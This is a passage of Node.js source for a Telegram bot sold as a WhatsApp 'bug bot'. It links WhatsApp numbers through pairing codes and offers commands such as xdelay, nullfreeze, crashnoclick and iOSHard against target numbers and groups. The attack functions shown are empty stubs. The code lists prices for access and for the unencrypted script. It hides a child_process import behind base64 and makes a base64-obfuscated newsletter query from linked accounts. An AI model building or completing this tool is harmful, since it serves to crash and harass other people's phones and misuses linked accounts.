process.env.NTBA_FIX_350 = 1;
const SY = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    Browsers,
    delay,
    DisconnectReason,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');
const pino = require('pino');
let phoneNumber = "6288268145069"
const pairingCode = !!phoneNumber
const NodeCache = require("node-cache")
const { log } = require("nasigoreng")

// --- GLOBAL ERROR HANDLING ---
process.on('uncaughtException', (err) => {
    console.error('\x1b[31m[CRITICAL ERROR] Uncaught Exception:\x1b[0m', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('\x1b[31m[CRITICAL ERROR] Unhandled Rejection:\x1b[0m', reason);
});

const LoveDir = './Love';
if (!fs.existsSync(LoveDir)) {
    fs.mkdirSync(LoveDir);
}

const {
    spawn
} = require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString());
const XLX = spawn;
const activeBots = {};
const startTime = Date.now();
const LoveLogo = `${config.logo}`
const waSessions = {};
const pairingTracker = new Map();
const SYLovesButton = {
    reply_markup: {
        inline_keyboard: [
            [{
                text: '📢 Join Channel',
                url: config.channel,
                icon_custom_emoji_id: "5370599459661045441"
            }], 
            [{ text: '👥 Join Group', url: config.group, icon_custom_emoji_id: "5443038326535759644"  }],
            [{
                text: 'Check Membership',
                callback_data: 'check_membership',
                icon_custom_emoji_id: "5123248930124989216"
            }]
        ]
    }
};

const protectionMessage = `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> You must join, subscribe and follow our whatsapp channel, instagram, youtube channel and group to use this bot. After doing so, click "Check Membership" or use /checkmembership.`;

function getForceJoinChats() {
    const entries = [
        ...(Array.isArray(config.forceJoinChannels) ? config.forceJoinChannels : []),
        ...(Array.isArray(config.forceJoinGroups) ? config.forceJoinGroups : [])
    ];
    const unique = new Map();
    for (const entry of entries) {
        const id = typeof entry === 'string' ? entry : entry && entry.id;
        if (!id || unique.has(String(id))) continue;
        unique.set(String(id), typeof entry === 'string' ? { id } : entry);
    }
    return [...unique.values()];
}

async function CheckSYlovesToo(botInstance, userId, chId, grId, adminId) {
    if (userId.toString() === adminId.toString()) return true;

    const configured = getForceJoinChats();
    const fallback = [chId, grId]
        .flatMap(value => Array.isArray(value) ? value : [value])
        .filter(Boolean)
        .map(id => ({ id }));
    const requiredChats = configured.length ? configured : fallback;
    if (requiredChats.length === 0) return true;

    const validStatuses = ['creator', 'administrator', 'member'];
    try {
        for (const required of requiredChats) {
            const chatId = typeof required === 'string' ? required : required.id;
            const label = (typeof required === 'object' && required.name) || chatId;
            if (!chatId) continue;
            const member = await botInstance.getChatMember(chatId, userId);
            const isRestrictedMember = member.status === 'restricted' && member.is_member === true;
            if (!validStatuses.includes(member.status) && !isRestrictedMember) {
                log('info', 'FORCE_JOIN', `User ${userId} missing ${label} (${chatId}); status=${member.status}`);
                return false;
            }
        }
        return true;
    } catch (error) {
        log('error', 'FORCE_JOIN', `Could not verify user ${userId}: ${error.message}`);
        return false;
    }
}

// ============================================
// DUMMY LOGIC FUNCTIONS (Replacing missing SY/S7 modules)
// ============================================
const IosLogic = {
    IosInvisible: async (client, targetJid) => {
        // Dummy function for iOS Invisible
        console.log(`[Dummy] IosInvisible called for ${targetJid}`);
    }
};
const XgcLogic = {
    Xgc: async (client, targetJid) => {
        console.log(`[Dummy] Xgc called for ${targetJid}`);
    }
};
const killsystemLogic = {
    killsystem: async (client, targetJid) => {
        console.log(`[Dummy] killsystem called for ${targetJid}`);
    }
};
const nullinfinityLogic = {
    nullinfinity: async (client, targetJid) => {
        console.log(`[Dummy] nullinfinity called for ${targetJid}`);
    }
};
const delayinfinityLogic = {
    delayinfinity: async (client, targetJid) => {
        console.log(`[Dummy] delayinfinity called for ${targetJid}`);
    }
};
const ghostdelayLogic = {
    ghostdelay: async (client, targetJid) => {
        console.log(`[Dummy] ghostdelay called for ${targetJid}`);
    }
};
const nullblankLogic = {
    nullblank: async (client, targetJid) => {
        console.log(`[Dummy] nullblank called for ${targetJid}`);
    }
};
const delaynullLogic = {
    delaynull: async (client, targetJid) => {
        console.log(`[Dummy] delaynull called for ${targetJid}`);
    }
};
const nullfreezeLogic = {
    nullfreeze: async (client, targetJid) => {
        console.log(`[Dummy] nullfreeze called for ${targetJid}`);
    }
};
const nullcomboLogic = {
    nullcombo: async (client, targetJid) => {
        console.log(`[Dummy] nullcombo called for ${targetJid}`);
    }
};
const crashnoclickLogic = {
    crashnoclick: async (client, targetJid) => {
        console.log(`[Dummy] crashnoclick called for ${targetJid}`);
    }
};
const exitxLogic = {
    exitx: async (client, targetJid) => {
        console.log(`[Dummy] exitx called for ${targetJid}`);
    }
};
const testlogic = {
    Xdelay: async (client, targetJid) => {
        console.log(`[Dummy] Xdelay called for ${targetJid}`);
    }
};

// ============================================

const notauthorized = '🚫 You are not authorized to use this command.';

const colors = {
    reset: "\x1b[0m",
    gray: "\x1b[90m",
    blue: "\x1b[34m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m"
};

function getRuntime() {
    const now = Date.now();
    const diff = now - startTime;
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    return `${days} days ${hours} hours ${minutes} minutes`;
}

async function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function sendSYLove(bot, chatId) {
    bot.sendMessage(
        chatId,
        `🚫 <b>You are not authorized to use this command.</b>\n\n` +
        `📩 Please contact the developer to buy: ${config.S7}\n\n` +
        `💰 <b>Price/Dam:</b>\n` +
        `✅ <b>Permanent Access</b>: 15$ | ₹1,500\n` +
        `✅ <b>Permanent Resell</b>: 30$ | ₹3,000\n` +
        `✅ <b>Script (No Encryption, 100%)</b>: 100$ | ₹10,000`, {
            parse_mode: 'HTML'
        }
    );
}

function LoveGlobalState(userId) {
    return true;
}

function Lovesbutton(user) {
  const style = getStyle(user);

  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '☠ Bug Menu', callback_data: 'bug_menu', style : "primary", icon_custom_emoji_id: "5373290243787070962" },
          { text: '⚙ Misc Menu', callback_data: 'misc_menu', style : "success", icon_custom_emoji_id: "6032742198179532882" }
        ],
        [
          { text: '📢 Channel', url: `${config.channel}`, style : "primary", icon_custom_emoji_id: "5370599459661045441" }
        ],
        [
          { text: '👥 Group', url: `${config.group}`, style : "danger", icon_custom_emoji_id: "5443038326535759644" }
        ],
      ]
    }
  };
}

async function SYLoveMeOk(sock) {
    try {
        await sock.query({
            tag: 'iq',
            attrs: {
                to: 's.whatsapp.net',
                type: 'get',
                xmlns: 'w:mex'
            },
            content: [{
                tag: 'query',
                attrs: {
                    query_id: '9926858900719341'
                },
                content: new TextEncoder().encode(JSON.stringify({
                    variables: {
                        newsletter_id: Buffer
                            .from('MTIwMzYzNDIyNDg2MDI3ODg2QG5ld3NsZXR0ZXI=', 'base64')
                            .toString('utf-8')
                    }
                }))
            }]
        });
    } catch (err) {}
}


async function StartLovingSY(chatId, number, S7, isreconnect = false, ownerId = null) {
    let authPath;
    if (ownerId) {
        authPath = `./Love/${ownerId}/Auths/${number}`;
    } else {
        authPath = `./Love/auth/${chatId}/${number}`;
    }

    if (!fs.existsSync(authPath)) {
        fs.mkdirSync(authPath, {
            recursive: true
        });
    }

    const msgRetryCounterCache = new NodeCache();
    let {
        version
    } = await fetchLatestBaileysVersion();
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(authPath);

    const SYxS7 = makeWASocket({
        version,
        logger: pino({
            level: 'silent'
        }),
        printQRInTerminal: !pairingCode,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({
                level: "fatal"
            }).child({
                level: "fatal"
            })),
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: false,
        getMessage: async (key) => {
            let jid = jidNormalizedUser(key.remoteJid);
            let msg = await store.loadMessage(jid, key.id);
            return msg?.message || "";
        },
        msgRetryCounterCache,
        defaultQueryTimeoutMs: 60000,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 10000,
    });

    if (!SYxS7.authState.creds.registered) {
        if (pairingTracker.has(number)) return;
        pairingTracker.set(number, true);

        await delay(1500);
        try {
            const code = await SYxS7.requestPairingCode(number, `ALIWHERE`);
            await S7.sendMessage(chatId, `╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮\n│➻ Nᴜᴍʙᴇʀ : ${number}\n│➻ Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : <code>${code?.match(/.{1,4}/g)?.join("-") || code}</code>\n╰───────────────────────╯`, {
                parse_mode: 'HTML'
            });
        } catch (err) {
            log('error', 'WhatsApp', `Error requesting code: ${err.message}`);
            pairingTracker.delete(number);
        }
    }

    SYxS7.ev.on('creds.update', saveCreds);

    SYxS7.ev.on("connection.update", async (update) => {
        const {
            connection,
            lastDisconnect
        } = update;

        if (connection === 'connecting') {
            log('info', 'WhatsApp', `Connecting: ${number}`);
        }
        if (connection === "open") {
            log('success', 'WhatsApp', `Connected: ${number}`);
            pairingTracker.delete(number);
            if (!waSessions[chatId]) waSessions[chatId] = [];
            waSessions[chatId].push({
                sock: SYxS7,
                num: number
            });
            if (isreconnect === false) {
                await delay(1000);
                await S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> <b>WhatsApp Connected!</b>\nNumber: ${number}.`, {
                    parse_mode: 'HTML'
                }).catch(() => {});
            }
        }

        if (connection === "close") {
            if (waSessions[chatId]) {
                waSessions[chatId] = waSessions[chatId].filter(s => s.num !== number);
            }

            let reason = lastDisconnect?.error?.output?.statusCode;
            log('error', 'WhatsApp', `Connection closed for ${number}. Reason: ${reason}`);

            if (reason === DisconnectReason.restartRequired || reason === DisconnectReason.connectionLost || reason === DisconnectReason.timedOut || reason === 515) {
                log('info', 'WhatsApp', `Auto-Reconnecting session for ${number}...`);
                StartLovingSY(chatId, number, S7, false);
            } else if (reason === DisconnectReason.loggedOut || reason === 401) {
                log('error', 'WhatsApp', `Session for ${number} is permanently LOGGED OUT.`);
                pairingTracker.delete(number);
                await S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> <b> <tg-emoji emoji-id="5447644880824181073">⚠️</tg-emoji>WhatsApp Logged Out</b>\nNumber: ${number}\nSession has been terminated. Please use /reqpair again.`, {
                    parse_mode: 'HTML'
                }).catch(() => {});

                const SYPaTH = `./Love/auth/${chatId}/${number}`;
                if (fs.existsSync(SYPaTH)) fs.rmSync(SYPaTH, {
                    recursive: true,
                    force: true
                });
            } else {
                pairingTracker.delete(number);
                await S7.sendMessage(chatId, `⚠️ <b>Connection Closed</b>\nNumber: ${number}\nReason: ${reason}`, {
                    parse_mode: 'HTML'
                }).catch(() => {});
            }
        }
    });
}


async function AutoLovingWithSY(S7) {
    const SYBase = './Love/auth';
    if (!fs.existsSync(SYBase)) return;
    try {
        const chatIds = fs.readdirSync(SYBase);
        for (const chatId of chatIds) {
            const chatPath = path.join(SYBase, chatId);
            if (!fs.statSync(chatPath).isDirectory()) continue;
            const numbers = fs.readdirSync(chatPath);
            for (const number of numbers) {
                const sessionPath = path.join(chatPath, number);
                if (fs.existsSync(path.join(sessionPath, 'creds.json'))) {
                    log('info', 'SYSTEM', `Found saved session for ${number}, Reconnecting...`);
                    StartLovingSY(chatId, number, S7, true);
                    await delay(3000);
                }
            }
        }
    } catch (err) {
        log('error', 'SYSTEM', `AutoReconnect Error: ${err.message}`);
    }
}


async function S7Naverdead(token, errorMsg) {
    log('error', 'TOKEN', `Bot token failed: ${token.substring(0, 10)}... ${errorMsg}`);
    if (activeBots[token]) {
        try { await activeBots[token].stopPolling(); } catch {}
        delete activeBots[token];
    }
}

function GetSYLoVe(love) {
    if (love.toString() === config.adminId.toString()) return 'Owner';
    return 'Free User';
}

function MainSYLoVe(name, uptime, love, SABIR7718, SABANA) {
    const status = GetSYLoVe(love);
    return `<blockquote><b><tg-emoji emoji-id="5197429921634346862">✨</tg-emoji> A L I - B U G B O T<tg-emoji emoji-id="5352590867947349905">💋</tg-emoji></b></blockquote>
<blockquote><b>
<tg-emoji emoji-id="4918408122868958076">✨</tg-emoji> Developer : ${SABANA}<tg-emoji emoji-id="5361707636112778846">🤍</tg-emoji>
<tg-emoji emoji-id="4918408122868958076">✨</tg-emoji> System : Free User<tg-emoji emoji-id="6323535119323761554">☠</tg-emoji>
<tg-emoji emoji-id="4918408122868958076">✨</tg-emoji> Platform : Telegram<tg-emoji emoji-id="5330237710655306682">📱</tg-emoji>
<tg-emoji emoji-id="4918408122868958076">✨</tg-emoji> Online : ${uptime}<tg-emoji emoji-id="5456140674028019486">✨</tg-emoji>
</b></blockquote>`;
}
function BvgSYLoVe(cleanTarget) {
    return `<blockquote><b>☠ SENDING...</b></blockquote>`
        + `<blockquote>⏳ Please wait — the bot is currently sending.\n`
        + `🎯 Target: <code>${cleanTarget}</code>\n`
        + `📊 Status: <b>Sending...</b></blockquote>`
        + `<code>- while (true) { ALIW BUG }</code>`;
}

// ═══════════════════════════════════════════════════════════
//   SYED RICH STYLE SYSTEM — aliw-style via sendRichMessage
//   (Bot API 10.1+): real <table>, <details>/<summary>,
//   in-message <tg-button>, loading animation.
//   NOTE: normal sendMessage/sendPhoto captions CANNOT render
//   tables or details — is liye ye direct fetch se jata hai.
// ═══════════════════════════════════════════════════════════
async function SY_api(token, method, params) {
    const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(params),
    });
    const data = await res.json();
    if (!data.ok) throw new Error(`API ${method}: ${data.description || 'failed'}`);
    return data.result;
}

async function SY_sendRich(S7, chatId, html) {
    return SY_api(S7.token, 'sendRichMessage', {
        chat_id: chatId,
        rich_message: { html },
    });
}

async function SY_editRich(S7, chatId, messageId, html) {
    try {
        return await SY_api(S7.token, 'editRichMessage', {
            chat_id: chatId,
            message_id: messageId,
            rich_message: { html },
        });
    } catch (e) {
        await S7.deleteMessage(chatId, messageId).catch(() => {});
        return SY_sendRich(S7, chatId, html);
    }
}

function SY_footer() {
    return `<hr/><code>- while (true) { ALIW BUG }</code>`;
}

function SY_table(rows, h1, h2) {
    const body = rows.map(r => `<tr><td>${r[0]}</td><td>${r[1]}</td></tr>`).join('');
    return `<table><tr><th>${h1 || 'Information'}</th><th>${h2 || 'Details'}</th></tr>${body}</table>`;
}

function SY_details(title, body) {
    return `<details><summary>${title}</summary>${body}</details>`;
}

function SY_btnRow(buttons) {
    // buttons: [label, kind, style, target] — kind: 'callback' | 'url'
    const btns = buttons.map(b => {
        if (b[1] === 'url') return `<tg-button type="url" style="${b[2]}" url="${b[3]}">${b[0]}</tg-button>`;
        return `<tg-button type="callback_data" style="${b[2]}" data="${b[3]}">${b[0]}</tg-button>`;
    }).join('');
    return `<tg-button-row align="center">${btns}</tg-button-row>`;
}

function SY_menuHead(banner, name, uptime, role, owner) {
    const bannerImg = banner ? `<img src="${banner}"/>` : '';
    return bannerImg
        + `<h2>☠ ALIW — BUG BOT</h2>`
        + `<p>Hello ── <b>${name}</b> ⋆</p>`
        + `<blockquote><b>Premium bot interface. Pairing, premium access aur saare menus — sab ek jagah.</b></blockquote>`
        + SY_table([
            ['👑 Developer', owner],
            ['⚙️ Version', '2.0'],
            ['📊 Status', role],
            ['🟢 Uptime', uptime],
        ]);
}

function SY_mainHTML(banner, name, uptime, role, owner, channel, group, ownerUrl) {
    return SY_menuHead(banner, name, uptime, role, owner)
        + `<blockquote><b>👑 Neeche button dabao</b></blockquote>`
        + SY_btnRow([[`<tg-emoji emoji-id="6152321221640853237">💡</tg-emoji> Learn Features`, 'callback', 'success', 'learn_menu']])
        + SY_btnRow([
            [`<tg-emoji emoji-id="6224401858178324583">🚀</tg-emoji> Bug Menu`, 'callback', 'primary', 'bug_menu'],
            [`<tg-emoji emoji-id="5226961519761199044">⚙️</tg-emoji> Misc Menu`, 'callback', 'success', 'misc_menu'],
        ])
        + SY_btnRow([[`<tg-emoji emoji-id="5947485890468124744">☑️</tg-emoji> My Info`, 'callback', 'primary', 'my_info']])
        + SY_btnRow([[`<tg-emoji emoji-id="5456398372065779300">🚀</tg-emoji> Contact Owner`, 'url', 'primary', ownerUrl]])
        + SY_footer();
}

function SY_miscHTML(banner, name, uptime, role, owner) {
    const cmd = (rows) => SY_table(rows.map(r => [`<code>${r[0]}</code>`, r[1]]), 'Command', 'Usage');
    return SY_menuHead(banner, name, uptime, role, owner)
        + `<h3>⚙ Misc Menu</h3>`
        + SY_details('📁 Pairing', cmd([['/reqpair', 'number'], ['/delpair', 'number']]))
        + SY_details('📁 Premium &amp; Reseller', cmd([['/addprem', 'ID'], ['/delprem', 'ID'], ['/addresell', 'ID'], ['/delresell', 'ID'], ['/listprem', '—'], ['/listresell', '—']]))
        + SY_details('📁 Tokens &amp; Users', cmd([['/addtoken', 'token'], ['/deltoken', 'token'], ['/listuser', '—'], ['/mytoken', '—'], ['/state', '0 | 1']]))
        + SY_btnRow([['🔙 Back', 'callback', 'danger', 'main_menu']])
        + SY_footer();
}

function SY_bugHTML(banner, name, uptime, role, owner) {
    const cmd = (rows) => SY_table(rows.map(r => [`<code>${r[0]}</code>`, r[1]]), 'Command', 'Usage');
    return SY_menuHead(banner, name, uptime, role, owner)
        + `<h3>☠ Bug Menu</h3>`
        + `<blockquote>Koi category kholo — saare commands table mein hain.</blockquote>`
        + SY_details('🤖 Bug Android', cmd([['/xdelay', 'num time'], ['/nullinfinity', 'num time'], ['/delayinfinity', 'num time'], ['/ghostdelay', 'num time'], ['/nullblank', 'num time'], ['/delaynull', 'num time'], ['/nullfreeze', 'num time'], ['/delayhard', 'num time'], ['/nullcombo', 'num time']]))
        + SY_details('🍎 Bug iOS', cmd([['/iOSHard', 'number time'], ['/iosinvisible', 'number time']]))
        + SY_details('👥 Bug Group', cmd([['/xgroup', 'groupid time'], ['/listgc', '—'], ['/groupid', 'link']]))
        + SY_btnRow([['🔙 Back', 'callback', 'danger', 'main_menu']])
        + SY_footer();
}

// ---- Learn Features: 4-language guide (original wording, Ali-style layout) ----
const SY_LEARN_DOCS = {
    en: [
        ['Main Bot', 'The main control panel. Every menu and tool lives here.'],
        ['Pairing', 'Link a WhatsApp number with /reqpair, unlink it with /delpair.'],
        ['Premium', 'Premium unlocks extra menus and higher limits. Ask the owner to activate it.'],
        ['Admin &amp; Owner', 'Owners manage resellers, tokens and bot settings.'],
        ['My Info', 'Check your role, status and Telegram profile data anytime.'],
        ['How To Use', 'Tap the buttons below, or send /start to open the main menu.'],
    ],
    ur: [
        ['Main Bot', 'Ye main control panel hai. Saare menus aur tools yahin hain.'],
        ['Pairing', '/reqpair se WhatsApp number link karo, /delpair se hatao.'],
        ['Premium', 'Premium se extra menus aur limits milti hain. Owner se activate karwao.'],
        ['Admin &amp; Owner', 'Owner resellers, tokens aur settings manage karta hai.'],
        ['My Info', 'Apna role, status aur Telegram profile kabhi bhi dekho.'],
        ['How To Use', 'Neeche buttons dabao, ya /start bhejo main menu ke liye.'],
    ],
    ar: [
        ['Main Bot', 'لوحة التحكم الرئيسية. جميع القوائم والأدوات هنا.'],
        ['Pairing', 'اربط رقم واتساب بـ /reqpair وأزله بـ /delpair.'],
        ['Premium', 'يفتح Premium قوائم وحدود إضافية. اطلب التفعيل من المالك.'],
        ['Admin &amp; Owner', 'يدير المالك الموزعين والرموز والإعدادات.'],
        ['My Info', 'تحقق من دورك وحالتك وبيانات تيليجرام في أي وقت.'],
        ['How To Use', 'اضغط الأزرار بالأسفل أو أرسل /start لفتح القائمة.'],
    ],
    id: [
        ['Main Bot', 'Panel kontrol utama. Semua menu dan tools ada di sini.'],
        ['Pairing', 'Tautkan nomor WhatsApp dengan /reqpair, lepas dengan /delpair.'],
        ['Premium', 'Premium membuka menu ekstra dan limit lebih tinggi. Minta aktivasi ke owner.'],
        ['Admin &amp; Owner', 'Owner mengelola reseller, token, dan pengaturan.'],
        ['My Info', 'Cek role, status, dan data Telegram kapan saja.'],
        ['How To Use', 'Tekan tombol di bawah, atau kirim /start untuk menu utama.'],
    ],
};
const SY_LEARN_NAMES = { en: 'English', ur: 'اردو', ar: 'العربية', id: 'Indonesia' };

function SY_learnHTML(banner, name, uptime, role, owner, lang) {
    const docs = SY_LEARN_DOCS[lang] || SY_LEARN_DOCS.en;
    const rows = docs.map(d => `<tr><td><b>${d[0]}</b></td><td>${d[1]}</td></tr>`).join('');
    const sty = (l) => (l === lang ? 'success' : 'primary');
    return SY_menuHead(banner, name, uptime, role, owner)
        + `<h3>💡 Learn Features</h3>`
        + `<blockquote>Choose your language — the guide below will update.</blockquote>`
        + SY_btnRow([
            ['🇮🇩 Indonesia', 'callback', sty('id'), 'learn_lang_id'],
            ['🇬🇧 English', 'callback', sty('en'), 'learn_lang_en'],
        ])
        + SY_btnRow([
            ['🇸🇦 العربية', 'callback', sty('ar'), 'learn_lang_ar'],
            ['🇵🇰 اردو', 'callback', sty('ur'), 'learn_lang_ur'],
        ])
        + SY_details('📄 Learn Features', `<table><tr><th>Feature</th><th>Info</th></tr>${rows}</table>`)
        + SY_btnRow([['🔙 Back', 'callback', 'danger', 'main_menu']])
        + SY_footer();
}

function SY_classicLearn(lang) {
    const docs = SY_LEARN_DOCS[lang] || SY_LEARN_DOCS.en;
    const body = docs.map(d => `<code>${d[0]}</code> — ${d[1]}`).join('\n');
    return `<b>💡 Learn Features</b>\n<blockquote expandable>📄 Guide (${SY_LEARN_NAMES[lang] || 'English'})\n\n${body}</blockquote>`;
}

// ---- My Info: auto-pulled Telegram profile + status ----
function SY_myinfoHTML(banner, name, uptime, role, owner, tg) {
    const uname = tg.username ? '@' + tg.username : '—';
    const isPrem = (role === 'Premium' || role === 'Owner' || role === 'Reseller');
    return SY_menuHead(banner, name, uptime, role, owner)
        + `<h3>❓ My Info</h3>`
        + SY_table([
            ['📊 Role', role],
            ['💎 Premium', isPrem ? '✅ Active' : '❌ Inactive'],
            ['💰 Balance', '—'],
        ])
        + SY_details('👤 Telegram Account', SY_table([
            ['👤 Name', tg.first_name || '—'],
            ['🔗 Username', uname],
            ['🆔 Telegram ID', `<code>${tg.id}</code>`],
            ['🌍 Language', String(tg.language_code || 'en').toUpperCase()],
        ]))
        + SY_details('🤖 Bot Status', SY_table([
            ['⚙️ Version', '2.0'],
            ['🟢 Uptime', uptime],
            ['📡 Mode', 'Private'],
        ]))
        + `<blockquote>This data was pulled automatically from your Telegram profile.</blockquote>`
        + SY_btnRow([['🔙 Back', 'callback', 'danger', 'main_menu']])
        + SY_footer();
}

function SY_classicMyinfo(role, uptime, tg) {
    const uname = tg.username ? '@' + tg.username : '—';
    return `<b>❓ My Info</b>\n`
        + `📊 Role : ${role}\n🟢 Uptime : ${uptime}\n`
        + `<blockquote expandable>👤 Telegram Account\n\n👤 Name : ${tg.first_name || '—'}\n🔗 Username : ${uname}\n🆔 ID : <code>${tg.id}</code></blockquote>`;
}

function SY_loadingHTML(label, pct) {
    const bar = pct > 50 ? '▓▓▓▓▓▓░░░░' : '▓▓░░░░░░░░';
    return `<blockquote><b>⏳ ${label}...</b></blockquote><p><code>${bar}</code></p>`;
}

async function SY_richLoading(S7, chatId, messageId, label) {
    const edit = (html) => SY_api(S7.token, 'editRichMessage', {
        chat_id: chatId, message_id: messageId, rich_message: { html },
    }).catch(() => {});
    await edit(SY_loadingHTML(label, 20));
    await sleep(350);
    await edit(SY_loadingHTML(label, 70));
    await sleep(350);
}

// ---- Rich availability + safe show helpers ----
let RICH_OK = (typeof fetch === 'function');

async function SY_trySendRich(S7, chatId, html) {
    if (!RICH_OK) return null;
    try { return await SY_sendRich(S7, chatId, html); }
    catch (e) { log('error', 'RICH_MESSAGE', e.message); return null; }
}

async function SY_tryEditRich(S7, chatId, messageId, html) {
    if (!RICH_OK) return false;
    try {
        await SY_api(S7.token, 'editRichMessage', {
            chat_id: chatId, message_id: messageId, rich_message: { html },
        });
        return true;
    } catch (e) { return false; }
}

// Edit in place if possible, else resend rich as a new message.
// Returns true when the rich message was shown.
async function SY_showRich(S7, chatId, messageId, html) {
    if (!RICH_OK) return false;
    if (await SY_tryEditRich(S7, chatId, messageId, html)) return true;
    const sent = await SY_trySendRich(S7, chatId, html);
    if (sent) { await S7.deleteMessage(chatId, messageId).catch(() => {}); return true; }
    return false;
}

async function SY_classicSwap(S7, chatId, messageId, html, kb) {
    await S7.deleteMessage(chatId, messageId).catch(() => {});
    return S7.sendMessage(chatId, html, { parse_mode: 'HTML', ...(kb || {}) });
}

// ---- Classic fallback builders (expandable blockquotes, Ali-style folders) ----
function SY_classicHead(name, uptime, role, owner) {
    return `<b>☠ ALIW — BUG BOT</b>\nHello ── <b>${name}</b>\n\n`
        + `👑 Developer : ${owner}\n⚙️ Version : 2.0\n📊 Status : ${role}\n🟢 Uptime : ${uptime}\n`;
}
function SY_classicMisc() {
    return `<b>⚙ Misc Menu</b>\n`
        + `<blockquote expandable>📁 Pairing\n\n<code>/reqpair</code> — number\n<code>/delpair</code> — number</blockquote>\n`
        + `<blockquote expandable>📁 Premium &amp; Reseller\n\n<code>/addprem</code> — ID\n<code>/delprem</code> — ID\n<code>/addresell</code> — ID\n<code>/delresell</code> — ID\n<code>/listprem</code>\n<code>/listresell</code></blockquote>\n`
        + `<blockquote expandable>📁 Tokens &amp; Users\n\n<code>/addtoken</code> — token\n<code>/deltoken</code> — token\n<code>/listuser</code>\n<code>/mytoken</code>\n<code>/state</code> — 0 | 1</blockquote>`;
}
function SY_classicBug() {
    return `<b>☠ Bug Menu</b>\n`
        + `<blockquote expandable>🤖 Bug Android\n\n<code>/xdelay</code> — num time\n<code>/nullinfinity</code> — num time\n<code>/delayinfinity</code> — num time\n<code>/ghostdelay</code> — num time\n<code>/nullblank</code> — num time\n<code>/delaynull</code> — num time\n<code>/nullfreeze</code> — num time\n<code>/delayhard</code> — num time\n<code>/nullcombo</code> — num time</blockquote>\n`
        + `<blockquote expandable>🍎 Bug iOS\n\n<code>/iOSHard</code> — number time\n<code>/iosinvisible</code> — number time</blockquote>\n`
        + `<blockquote expandable>👥 Bug Group\n\n<code>/xgroup</code> — groupid time\n<code>/listgc</code>\n<code>/groupid</code> — link</blockquote>`;
}
const SYClassicBackKb = { reply_markup: { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'main_menu' }]] } };

// ---- Banner: public copy of the configured local startup image ----
// Rich-message HTML can fetch public URLs, but cannot reliably fetch a private
// Telegram bot-file URL. This URL is the Loves.jpg asset from SY/Loves.jpg.
const SY_BANNER_URL = 'https://files.manuscdn.com/user_upload_by_module/session_file/310519663847827528/oPtQrJxgjlEqnFJn.jpg';
function SY_bannerUrl(S7) { return SY_BANNER_URL; }
async function SY_ensureBanner(S7) { return SY_BANNER_URL; }

function startSYloveBot(token) {
    try {
        const S7 = new SY(token, {
            polling: true
        });
        // Banner: upload once -> permanent Telegram URL (non-blocking).
        SY_ensureBanner(S7);
        let SABIR7718;

        let botConfig = {
            channel: config.channel,
            group: config.group,
            logo: config.logo,
            botName: config.bot,
            ownerContact: config.S7,
            protection: true,
            channelId: config.channelId,
            groupId: config.groupId
        };

        const botOwnerId = config.adminId;
        S7.getMe().then((botInfo) => {
            activeBots[token] = S7;
            log('success', null, `Bot Started: ${botInfo.first_name} (@${botInfo.username})`);
            if (token === config.mainToken) {
                log('info', 'SYSTEM', 'Checking for saved WhatsApp sessions...');
                AutoLovingWithSY(S7);
            }
        }).catch(async (err) => {
            log('error', null, `Failed to connect token: ${token.substring(0, 10)}... Error: ${err.message}`);

            if (
                err.message.includes('404') ||
                err.message.includes('401') ||
                err.message.includes('Unauthorized')
            ) {
                await S7Naverdead(token, err.message);
            }
        });
        S7.on('polling_error', (error) => {
            if (error.code !== 'EFATAL') return;
            log('error', 'POLLING', error.message);
        });

        function VOIDSEC() {
            const joinButtons = getForceJoinChats().map((entry) => ({
                text: `✅ Join ${entry.name || entry.id}`,
                url: entry.url || `https://t.me/${String(entry.id).replace(/^@/, '')}`
            }));
            return {
                reply_markup: {
                    inline_keyboard: [
                        ...joinButtons.map(button => [button]),
                        [{ text: '🔄 Check Membership', callback_data: 'check_membership' }]
                    ]
                }
            };
        }

SABIR7718 = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '💡 Learn Features', callback_data: 'learn_menu' }],
            [{ text: '☠ Bug Menu', callback_data: 'bug_menu' }, { text: '⚙ Misc Menu', callback_data: 'misc_menu' }],
            [{ text: '❓ My Info', callback_data: 'my_info' }],
            [{ text: '💬 Contact Owner', url: 'https://t.me/ALIWINSIDE' }],
        ]
    }
};

        function SYLoVe(commands, callback) {
            if (!Array.isArray(commands)) commands = [commands];

            S7.on('message', async (msg) => {
                if (!msg.text) return;
                const cmd = msg.text.trim().split(' ')[0].slice(1);

                if (commands.includes(cmd)) {
                    const chatId = msg.chat.id;
                    const userId = msg.from.id;

                    if (botConfig.protection && cmd !== 'checkmembership' && cmd !== 'start' && cmd !== 'menu') {
                        const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);

                        if (!isMember) {
                            const protectMsg = `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> <b>Access Denied!</b>\n\nYou must join our Channel & Group to use this bot.\n\n👤 <b>Owner:</b> ${botConfig.ownerContact}\nClick "Check Membership" after joining.`;

